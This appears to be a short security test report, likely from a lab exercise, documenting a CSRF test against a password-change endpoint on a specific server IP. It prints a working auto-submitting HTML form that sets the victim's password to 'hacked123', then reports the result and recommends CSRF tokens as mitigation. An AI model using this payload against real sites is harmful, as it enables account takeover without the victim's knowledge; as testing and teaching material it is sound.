CSRF (Cross-Site Request Forgery) was tested by creating a hidden HTML form that submitted a POST request to the password change endpoint on the droplet.

The form was hosted on a separate page and submitted automatically when visited.

<form action="http://159.89.114.45/change-password.php" method="POST">
  <input type="hidden" name="password" value="hacked123">
  <input type="submit" value="Submit">
</form>

Result:
The request was accepted by the server without requiring any authentication or CSRF token, which confirmed the CSRF vulnerability.

Mitigation:
Implement CSRF tokens in all sensitive forms and verify them server-side before processing the request. This prevents unauthorized cross-site submissions.
